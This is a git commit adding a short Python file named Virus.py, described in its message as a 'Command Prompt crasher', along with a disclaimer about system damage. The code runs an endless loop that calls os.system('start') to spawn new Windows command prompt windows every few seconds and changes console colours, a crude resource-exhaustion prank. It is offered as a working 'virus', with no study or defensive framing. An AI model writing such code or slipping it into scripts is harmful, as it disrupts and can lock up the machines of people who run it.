c9776f887e75c8266a1cf9cb3f43cc16ffe4aa64
Andrej123456789 <83548580+Andrej123456789@users.noreply.github.com>
2021-09-01 09:13:58 +0200

    Command Prompt crasher - Virus
    ringwormGO is not responsible for any system damage from opening this file
    3D Sandbox 3.0 coming soon

---
+++ Virus.py
@@ -0,0 +1,11 @@
+import os
+import time
+
+while True:
+    os.system("start")
+    time.sleep(5)
+    os.system("color 0a")
+    os.system("start")
+    os.system("color 0b")
+
+#For stop running do KeyboardInterrupt
